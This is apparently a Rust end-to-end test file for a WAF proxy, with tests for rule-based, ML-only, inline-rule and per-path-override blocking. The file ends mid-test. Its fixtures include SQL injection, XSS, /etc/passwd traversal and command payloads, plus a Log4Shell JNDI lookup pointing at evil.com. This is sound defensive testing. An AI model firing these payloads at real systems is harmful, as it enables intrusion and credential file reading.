//! End-to-end pipeline tests: proxy → WAF → upstream.
//!
//! Spins up a mock upstream and a `ProxyServer`, sends real HTTP
//! requests over TCP, and verifies that attacks are blocked and
//! clean traffic is forwarded.

use std::net::SocketAddr;
use std::path::Path;
use std::sync::Arc;

use arc_swap::ArcSwap;
use http::{header, Method, Request, StatusCode};
use hyper::body::Incoming;
use hyper_util::rt::TokioIo;
use sentinel_core::config::{
    ConfigHandle, ListenerConfig, Protocol, ProtocolSpec, SentinelConfig, SiteConfig,
    UpstreamConfig, UpstreamServer, WafConfig, WafMode,
};
use sentinel_proxy::ProxyServer;
use std::sync::Once;

use tokio::net::TcpListener;

static INIT: Once = Once::new();

/// Install the rustls crypto provider before any tests run.
/// ProxyServer internally uses rustls; this is required by rustls 0.23+.
fn install_crypto() {
    INIT.call_once(|| {
        let _ = rustls::crypto::ring::default_provider().install_default();
    });
}
use tokio::sync::watch;

// Each test needs a unique listen port to avoid bind conflicts.
static NEXT_PORT: std::sync::atomic::AtomicU16 = std::sync::atomic::AtomicU16::new(0);

/// Hand out a listen port that is unlikely to be taken by anything else.
///
/// ⚠️ This was a fixed counter from 42080, and that is inside Linux's default
/// ephemeral port range (32768–60999). So the kernel was free to hand one of our
/// ports to any unrelated outbound connection on the machine — a `cargo` fetch, a
/// sibling CI job, an `apk add` — for the moment we wanted to bind it. The proxy
/// then failed to bind with EADDRINUSE and the harness reported "proxy never
/// accepted a connection", which reads as a slow or broken proxy and sent me
/// looking at CPU contention. Pipeline 30209 failed exactly this way on port
/// 42084, and the test it blamed was unrelated to the change under test.
///
/// Two things fix it: a base BELOW the ephemeral range, and a per-process offset
/// so two test binaries on one runner do not share a block.
fn next_port() -> u16 {
    static BASE: std::sync::OnceLock<u16> = std::sync::OnceLock::new();
    let base = *BASE.get_or_init(|| {
        // 20000..30000 in 100-port blocks: below the ephemeral range, above the
        // well-known/registered ports this project uses (80, 443, 3000, 8080,
        // 9443, 9501). ~40 ports are needed per process.
        20_000 + (std::process::id() as u16 % 100) * 100
    });
    base + NEXT_PORT.fetch_add(1, std::sync::atomic::Ordering::SeqCst)
}

fn config_handle(cfg: SentinelConfig) -> ConfigHandle {
    Arc::new(ArcSwap::new(Arc::new(cfg)))
}

/// A cert dir for this test process. Unset, the proxy uses the developer's own
/// `$HOME/.config/sentinel/certs`.
fn scratch_cert_dir() -> std::path::PathBuf {
    std::env::temp_dir().join(format!("sentinel-e2e-certs-{}", std::process::id()))
}

fn crs_rule_dir() -> std::path::PathBuf {
    let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
    manifest.join("../../rules/owasp-crs/rules")
}

fn test_config(
    listen_port: u16,
    upstream_port: u16,
    rule_file: &str,
    mode: WafMode,
) -> SentinelConfig {
    let rule_path = crs_rule_dir().join(rule_file);
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
            proxy_protocol: false,
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
                host_header: None,
                keepalive: true,
                connect_timeout_secs: None,
                sni_name: None,
            },
            waf: WafConfig {
                mode,
                rules: vec![rule_path.to_string_lossy().to_string()],
                anomaly_threshold: 5,
                paranoia_level: 2,
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

/// Config for the ML-only test: NO WAF rules are loaded, but the ML engine is
/// enabled. Any block therefore comes purely from ML inference, not the rule
/// engine — proving the ML path works end-to-end in the proxy.
fn ml_only_config(listen_port: u16, upstream_port: u16, sensitivity: f32) -> SentinelConfig {
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
            proxy_protocol: false,
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
                host_header: None,
                keepalive: true,
                connect_timeout_secs: None,
                sni_name: None,
            },
            waf: WafConfig {
                mode: WafMode::Blocking,
                rules: vec![], // no rules — only ML can block
                anomaly_threshold: 3,
                paranoia_level: 2,
                ml: Some(sentinel_core::config::MlConfig {
                    enable: true,
                    models: vec![],
                    sensitivity,
                }),
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

// ---------------------------------------------------------------------------
// mock upstream
// ---------------------------------------------------------------------------

async fn start_mock_upstream() -> (SocketAddr, tokio::task::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind mock upstream");
    let addr = listener.local_addr().unwrap();
    let handle = tokio::spawn(async move {
        loop {
            let (stream, _) = match listener.accept().await {
                Ok(c) => c,
                Err(_) => break,
            };
            tokio::spawn(async move {
                let io = TokioIo::new(stream);
                let svc = hyper::service::service_fn(|req: Request<Incoming>| async move {
                    let path = req.uri().path().to_string();
                    let query = req
                        .uri()
                        .query()
                        .map(|q| format!("?{q}"))
                        .unwrap_or_default();
                    Ok::<_, std::convert::Infallible>(
                        http::Response::builder()
                            .status(StatusCode::OK)
                            .header(header::CONTENT_TYPE, "text/plain")
                            .body(format!("upstream-ok: {path}{query}"))
                            .unwrap(),
                    )
                });
                if let Err(e) = hyper::server::conn::http1::Builder::new()
                    .serve_connection(io, svc)
                    .await
                {
                    if !e.to_string().contains("connection closed") {
                        eprintln!("mock upstream error: {e}");
                    }
                }
            });
        }
    });
    (addr, handle)
}

/// Caps how many proxies may be STARTING at once.
///
/// Not a style choice — it fixes a thundering herd that turned this suite red on
/// findings that did not exist. Every test here spawns its own proxy, and each
/// startup compiles a CRS rule file, which is the expensive part. `cargo test`
/// runs the tests concurrently, so all ~34 startups landed simultaneously and
/// competed for the same cores; on a CI runner one listener lost the race badly
/// enough to miss even a 30 s bind budget, and the test that reported the failure
/// was an unrelated one that happened to be scheduled last (pipeline 30209,
/// `e2e_rce_attack_is_blocked`).
///
/// Raising the timeout again would only move the threshold. Limiting concurrent
/// STARTUPS removes the contention itself: tests still run in parallel, they just
/// take turns paying the CRS-compile cost. The permit is held until the listener
/// is actually accepting, so a queued test waits for a real slot rather than
/// piling on.
static PROXY_START_SLOTS: tokio::sync::Semaphore = tokio::sync::Semaphore::const_new(4);

async fn start_proxy(
    mut cfg: SentinelConfig,
) -> (
    watch::Sender<bool>,
    tokio::task::JoinHandle<anyhow::Result<()>>,
) {
    install_crypto();
    cfg.cert_dir.get_or_insert_with(scratch_cert_dir);
    // Capture the bind addresses before the config is moved into the server.
    let binds: Vec<String> = cfg.listeners.iter().map(|l| l.bind.clone()).collect();
    let handle = config_handle(cfg);
    let proxy = ProxyServer::new(handle);
    let (shutdown_tx, shutdown_rx) = watch::channel(false);
    // Held across spawn AND the bind wait: the point is to bound how many CRS
    // compiles are in flight, and that work happens inside `run` before the
    // listener binds.
    let permit = PROXY_START_SLOTS
        .acquire()
        .await
        .expect("PROXY_START_SLOTS is never closed");
    let mut jh = tokio::spawn(async move { proxy.run(shutdown_rx).await });
    for bind in &binds {
        jh = wait_until_accepting(bind, jh).await;
    }
    drop(permit);
    (shutdown_tx, jh)
}

/// Block until the proxy actually accepts connections on `bind`.
///
/// This was `sleep(300ms)` and hope. Every one of this file's ~29 tests goes
/// through `start_proxy`, and on a loaded CI runner 300 ms is not always enough
/// for the listener to finish binding — the test's own connect then fails with
/// ConnectionRefused and the suite goes red having found nothing. That happened
/// to pipeline 29924.
///
/// A CI that fails at random is worse than a slow one: it teaches everybody to
/// re-run the job instead of reading it, and then a real failure looks like the
/// usual noise. So this waits for the actual condition rather than guessing a
/// duration — and it is FASTER in the normal case, because the listener is
/// typically ready in a few milliseconds rather than 300.
///
/// Probing by connecting rather than by trying to bind the address ourselves:
/// binding would race the proxy for the port and could make it fail to start.
/// Wait for a freshly started proxy to bind.
///
/// The budget is generous on purpose. Every test in this binary spawns its own
/// proxy AND mock upstream, `cargo test` runs them concurrently, and each proxy
/// compiles a CRS rule file at startup — so the wall-clock cost of binding scales
/// with how many tests exist, not with how much work any one of them does. At 34
/// tests a 10s budget produced intermittent "never accepted a connection"
/// failures on two unrelated tests under load, which is a red CI run reporting a
/// bug that is not there.
///
/// Raising it costs nothing on the happy path: this is a poll loop that returns
/// the instant the port accepts, so a healthy proxy still proceeds in
/// milliseconds. Only a genuinely stuck proxy pays the full budget.
const PROXY_BIND_BUDGET: std::time::Duration = std::time::Duration::from_secs(30);

/// Takes the proxy's join handle and gives it back, so a proxy that DIED can be
/// reported with its own error instead of as a timeout.
///
/// Without this, a bind failure (EADDRINUSE, a permissions problem, a bad config)
/// looked identical to a slow start: the loop simply span until the budget
/// expired and blamed the proxy for being slow. That cost a whole diagnosis cycle
/// on pipeline 30209 — the message said "never accepted a connection" and the
/// actual cause was a port collision that `run` had already returned as an error
/// nobody read.
async fn wait_until_accepting(
    bind: &str,
    jh: tokio::task::JoinHandle<anyhow::Result<()>>,
) -> tokio::task::JoinHandle<anyhow::Result<()>> {
    let deadline = std::time::Instant::now() + PROXY_BIND_BUDGET;
    let mut delay = std::time::Duration::from_millis(2);
    loop {
        if tokio::net::TcpStream::connect(bind).await.is_ok() {
            return jh;
        }
        // The proxy exited rather than bound: surface ITS error, which names the
        // real problem.
        if jh.is_finished() {
            match jh.await {
                Ok(Ok(())) => panic!("proxy on {bind} exited cleanly before accepting"),
                Ok(Err(e)) => panic!("proxy on {bind} failed to start: {e:#}"),
                Err(e) => panic!("proxy task on {bind} panicked: {e}"),
            }
        }
        assert!(
            std::time::Instant::now() < deadline,
            "proxy never accepted a connection on {bind} within {PROXY_BIND_BUDGET:?} \
             (task still running, so this is genuinely slow rather than failed)"
        );
        tokio::time::sleep(delay).await;
        delay = (delay * 2).min(std::time::Duration::from_millis(50));
    }
}

async fn shutdown_proxy(tx: watch::Sender<bool>, jh: tokio::task::JoinHandle<anyhow::Result<()>>) {
    let _ = tx.send(true);
    let _ = jh.await;
}

async fn send_request(
    listen_port: u16,
    host: &str,
    uri: &str,
    method: Method,
    body: &str,
) -> (StatusCode, Vec<u8>) {
    // Bind a short-lived socket to allocate an ephemeral port for the client.
    // This ensures each test gets a fresh client port, avoiding TIME_WAIT conflicts.
    {
        let _stream = TcpListener::bind("127.0.0.1:0").await.unwrap();
    }

    let tcp = tokio::net::TcpSocket::new_v4()
        .unwrap()
        .connect(std::net::SocketAddr::new(
            std::net::IpAddr::V4(std::net::Ipv4Addr::LOCALHOST),
            listen_port,
        ))
        .await
        .expect("connect to proxy");

    let io = TokioIo::new(tcp);
    let (mut sender, conn) = hyper::client::conn::http1::handshake(io).await.unwrap();
    tokio::spawn(async move { conn.await.unwrap() });

    let req = Request::builder()
        .method(method)
        .uri(uri)
        .header(header::HOST, host)
        .header(
            header::USER_AGENT,
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0",
        );

    let req = if !body.is_empty() {
        req.header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
            .body(http_body_util::Full::new(bytes::Bytes::from(
                body.to_string(),
            )))
            .unwrap()
    } else {
        req.body(http_body_util::Full::new(bytes::Bytes::new()))
            .unwrap()
    };

    let resp = sender.send_request(req).await.expect("send request");
    let status = resp.status();

    use http_body_util::BodyExt;
    let body = resp.collect().await.unwrap().to_bytes().to_vec();
    (status, body)
}

// ============================================================================
// E2E Tests
// ============================================================================

#[tokio::test]
async fn clean_request_reaches_upstream() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/hello?name=world",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body.starts_with(b"upstream-ok:"));
}

#[tokio::test]
async fn sqli_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "SQLi attack should be 403");
}

#[tokio::test]
async fn xss_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "XSS attack should be 403");
}

#[tokio::test]
async fn health_check_endpoint() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) =
        send_request(listen_port, "test-site.local", "/healthz", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "healthz should return 200");
}

#[tokio::test]
async fn metrics_endpoint_is_scrapeable() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // Drive one real request first so the counters have moved, then scrape.
    let _ = send_request(listen_port, "test-site.local", "/", Method::GET, "").await;
    let (status, body) =
        send_request(listen_port, "test-site.local", "/metrics", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;

    assert_eq!(status, StatusCode::OK, "/metrics should return 200");
    let text = String::from_utf8(body).expect("metrics body is UTF-8");
    // Prometheus exposition format with the WAF counters present.
    assert!(
        text.contains("# TYPE sentinel_requests_total counter"),
        "expected prometheus TYPE header, got:\n{text}"
    );
    assert!(text.contains("sentinel_requests_total"));
    assert!(text.contains("sentinel_blocked_total"));
    assert!(text.contains("sentinel_active_connections"));
}

#[tokio::test]
async fn post_body_sqli_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/login",
        Method::POST,
        "user=admin' OR 1=1--&pass=foo",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "POST SQLi body should be 403"
    );
}

#[tokio::test]
async fn learning_mode_passes_attack() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Learning,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%20UNION%20SELECT%20*%20FROM%20users",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "learning mode should forward");
    assert!(
        body.starts_with(b"upstream-ok:"),
        "learning mode should reach upstream"
    );
}

#[tokio::test]
async fn e2e_lfi_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/?file=../../etc/passwd",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "LFI attack should be 403");
}

#[tokio::test]
async fn e2e_rce_attack_is_blocked() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-932-APPLICATION-ATTACK-RCE.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/exec?cmd=cat%20/etc/passwd",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "RCE attack should be 403");
}

#[tokio::test]
async fn clean_post_passes_through() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = test_config(
        listen_port,
        upstream_addr.port(),
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/api/users",
        Method::POST,
        "name=John&email=john@example.com",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(status, StatusCode::OK, "clean POST should pass");
    assert!(body.starts_with(b"upstream-ok:"));
}
// ============================================================================
// ML inference E2E — no WAF rules loaded; only the ML engine can block.
// Proves the trained classifier + anomaly model run on the live request path
// and drive the block decision.
// ============================================================================

#[tokio::test]
async fn e2e_ml_blocks_attack_with_no_rules() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    // sensitivity 0.6: the trained classifier scores SQLi well above this.
    let cfg = ml_only_config(listen_port, upstream_addr.port(), 0.6);
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // Strong SQLi in the body. No SQLi rules are loaded, so only ML can flag it.
    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/login",
        Method::POST,
        "user=admin&q=1' UNION SELECT username,password FROM users-- -",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "ML inference (no rules) should block the SQLi payload, got {status}"
    );
}

#[tokio::test]
async fn e2e_ml_allows_clean_request_with_no_rules() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = ml_only_config(listen_port, upstream_addr.port(), 0.6);
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    // A benign request shaped like normal traffic must pass — ML must not be a
    // blanket blocker.
    let (status, body) = send_request(
        listen_port,
        "test-site.local",
        "/products?page=1&sort=price",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::OK,
        "clean request must pass ML, got {status}"
    );
    assert!(body.starts_with(b"upstream-ok:"));
}

// ---------------------------------------------------------------------------
// Operator-authored (inline) rules from the control plane.
//
// Until 2026-07-28 these were stored in Postgres and never delivered, so a rule
// written in the UI showed as "enabled" and did nothing. These tests exercise the
// delivered path end-to-end through a real proxy, and pin the two failure
// behaviours that decide whether the feature is safe to expose to a customer.
// ---------------------------------------------------------------------------

use sentinel_core::config::InlineRule;

// Real SRL. NOTE: the rule's name IS its numeric id, and the operator form is
// `rx /pattern/` — not the `rule foo { id: N; op: rx("...") }` shape that the
// seeded sample rules use, which does not parse at all.
const LOG4SHELL_SRL: &str = r#"
rule 9999900 {
    phase    : request_body
    targets  : ARGS
    operator : rx /\$\{jndi:/
    action   : block
    severity : critical
    message  : "Log4Shell JNDI lookup"
}
"#;

const MARKER_SRL: &str = r#"
rule 9999901 {
    phase    : request_body
    targets  : ARGS
    operator : rx /EVILMARKER/
    action   : block
    severity : critical
    message  : "test marker"
}
"#;

const SHADOW_SRL: &str = r#"
rule 942100 {
    phase    : request_body
    targets  : ARGS
    operator : rx /NEVERMATCHES/
    action   : log
    severity : info
    message  : "attempted shadow of a shipped rule id"
}
"#;

/// A site carrying ONLY inline rules — no rule files at all — so any block is
/// necessarily produced by the inline path and nothing else.
fn inline_only_config(
    listen_port: u16,
    upstream_port: u16,
    inline: Vec<InlineRule>,
) -> SentinelConfig {
    SentinelConfig {
        listeners: vec![ListenerConfig {
            name: "test".into(),
            bind: format!("127.0.0.1:{listen_port}"),
            protocol: ProtocolSpec::Single(Protocol::Http1),
            tls: None,
            default_site: Some("test-site".into()),
            role: Default::default(),
            proxy_protocol: false,
        }],
        sites: vec![SiteConfig {
            id: "test-site".into(),
            tenant_id: String::new(),
            domains: vec!["test-site.local".into(), "localhost".into()],
            upstream: UpstreamConfig {
                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
                servers: vec![UpstreamServer {
                    host: "127.0.0.1".into(),
                    port: upstream_port,
                    weight: 1,
                    tls: false,
                }],
                health_check: None,
                timeout_secs: None,
                websocket: false,
                host_header: None,
                keepalive: true,
                connect_timeout_secs: None,
                sni_name: None,
            },
            waf: WafConfig {
                mode: WafMode::Blocking,
                rules: vec![],
                inline_rules: inline,
                anomaly_threshold: 5,
                paranoia_level: 2,
                ..Default::default()
            },
            plugins: vec![],
            tls: Default::default(),
            origin: Default::default(),
        }],
        ..Default::default()
    }
}

/// The headline case: a virtual patch written by an operator actually blocks.
/// Modelled on the Log4Shell shape, which is why the feature exists — a CVE lands
/// and waiting for a data-plane image rebuild is not an option.
#[tokio::test]
async fn inline_rule_from_control_plane_is_enforced() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = inline_only_config(
        listen_port,
        upstream_addr.port(),
        vec![InlineRule {
            name: "VP-CVE-2021-44228".into(),
            dsl: LOG4SHELL_SRL.into(),
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (blocked, _) = send_request(
        listen_port,
        "test-site.local",
        "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
        Method::GET,
        "",
    )
    .await;
    let (allowed, _) =
        send_request(listen_port, "test-site.local", "/?x=ok", Method::GET, "").await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        blocked,
        StatusCode::FORBIDDEN,
        "an operator-authored rule must actually block; if this is 200 the rule \
         reached the data plane but was not enforced"
    );
    assert_eq!(
        allowed,
        StatusCode::OK,
        "the inline rule must not block unrelated traffic"
    );
}

/// A rule typed into a web form WILL sometimes be malformed. One bad row must not
/// disarm the rules around it — that would turn an operator typo into an outage,
/// and it is the difference between this feature being safe to expose or not.
#[tokio::test]
async fn one_malformed_inline_rule_does_not_disarm_the_others() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = inline_only_config(
        listen_port,
        upstream_addr.port(),
        vec![
            InlineRule {
                name: "broken-rule".into(),
                dsl: "rule oops { this is not valid SRL at all ((( ".into(),
            },
            InlineRule {
                name: "good-rule".into(),
                dsl: MARKER_SRL.into(),
            },
        ],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/?q=EVILMARKER",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "the valid rule must still be enforced despite a malformed sibling"
    );
}

/// An inline rule reusing a shipped rule's id is refused rather than allowed to
/// shadow it: with two rules answering to one id, an exclusion for that id cannot
/// say which one it means, and scoring silently doubles.
#[tokio::test]
async fn inline_rule_may_not_shadow_a_shipped_rule_id() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();

    // Load the real CRS SQLi file, then try to redefine 942100 as a no-op that
    // would allow traffic the genuine rule blocks.
    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
    let mut cfg = inline_only_config(listen_port, upstream_addr.port(), vec![]);
    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
    cfg.sites[0].waf.inline_rules = vec![InlineRule {
        name: "shadow-942100".into(),
        dsl: SHADOW_SRL.into(),
    }];
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/search?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::FORBIDDEN,
        "the shipped 942100 must still block; a colliding inline rule must be \
         refused, not allowed to override it"
    );
}

// ---------------------------------------------------------------------------
// Per-path policy overrides.
//
// A site used to have exactly one policy, so an operator had to pick a single
// strictness that was necessarily wrong for part of the application. These pin
// the three behaviours that make the feature real rather than decorative:
// a stricter path blocks what the site would allow, a detect-only path lets
// through what the site would block, and an off path is genuinely exempt.
// ---------------------------------------------------------------------------

use sentinel_core::config::PathOverride;

/// A site with the CRS SQLi rules, a site-level threshold, and path overrides.
fn path_override_config(
    listen_port: u16,
    upstream_port: u16,
    site_threshold: u32,
    overrides: Vec<PathOverride>,
) -> SentinelConfig {
    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
    let mut cfg = test_config(
        listen_port,
        upstream_port,
        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
        WafMode::Blocking,
    );
    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
    cfg.sites[0].waf.anomaly_threshold = site_threshold;
    cfg.sites[0].waf.path_overrides = overrides;
    cfg
}

/// A path in learning mode must pass an attack the rest of the site blocks.
/// This is the "legacy endpoint we are still fixing" case.
#[tokio::test]
async fn path_override_learning_lets_attack_through() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![PathOverride {
            path_prefix: "/legacy/".into(),
            mode: Some(WafMode::Learning),
            anomaly_threshold: None,
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_legacy, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/legacy/report{attack}"),
        Method::GET,
        "",
    )
    .await;
    let (elsewhere, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/search{attack}"),
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        on_legacy,
        StatusCode::OK,
        "/legacy/ is learning-mode: the attack must be recorded, not blocked"
    );
    assert_eq!(
        elsewhere,
        StatusCode::FORBIDDEN,
        "the same attack outside the override must still block"
    );
}

/// A path in `off` mode is genuinely exempt — the case for static assets, where
/// the WAF only costs latency and false positives.
#[tokio::test]
async fn path_override_off_exempts_the_path() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![PathOverride {
            path_prefix: "/assets/".into(),
            mode: Some(WafMode::Off),
            anomaly_threshold: None,
        }],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let (status, _) = send_request(
        listen_port,
        "test-site.local",
        "/assets/app.js?q=1%27%20OR%201%3D1--",
        Method::GET,
        "",
    )
    .await;

    shutdown_proxy(shutdown_tx, jh).await;
    assert_eq!(
        status,
        StatusCode::OK,
        "an `off` path must pass traffic regardless of what the rules found"
    );
}

/// Longest prefix wins, independently of declaration order — otherwise an
/// operator's policy depends on the order they happened to add rows in, which is
/// not a property a security control may have.
#[tokio::test]
async fn path_override_longest_prefix_wins() {
    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
    let listen_port = next_port();
    // The SHORTER, more permissive prefix is declared first on purpose.
    let cfg = path_override_config(
        listen_port,
        upstream_addr.port(),
        5,
        vec![
            PathOverride {
                path_prefix: "/api/".into(),
                mode: Some(WafMode::Off),
                anomaly_threshold: None,
            },
            PathOverride {
                path_prefix: "/api/admin/".into(),
                mode: Some(WafMode::Blocking),
                anomaly_threshold: None,
            },
        ],
    );
    let (shutdown_tx, jh) = start_proxy(cfg).await;

    let attack = "?q=1%27%20OR%201%3D1--";
    let (on_api, _) = send_request(
        listen_port,
        "test-site.local",
        &format!("/api/list{attack}"),
        Method::GET,
